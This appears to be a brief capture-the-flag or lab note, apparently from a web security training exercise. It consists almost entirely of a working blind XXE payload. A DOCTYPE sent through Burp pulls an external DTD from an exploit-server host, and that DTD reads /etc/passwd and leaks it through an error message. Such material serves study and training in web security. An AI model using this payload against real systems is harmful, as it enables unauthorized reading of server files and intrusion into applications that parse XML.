```
In Burp:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<https://exploit-0a3a008003341db7c0583a26017100e5.exploit-server.net/exploit.dtd>"> %xxe;]>

Exploit Server:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil
```
![unnamed_86647e40b18e4005a8ee4dd0c2849917](unnamed_86647e40b18e4005a8ee4dd0c2849917.png)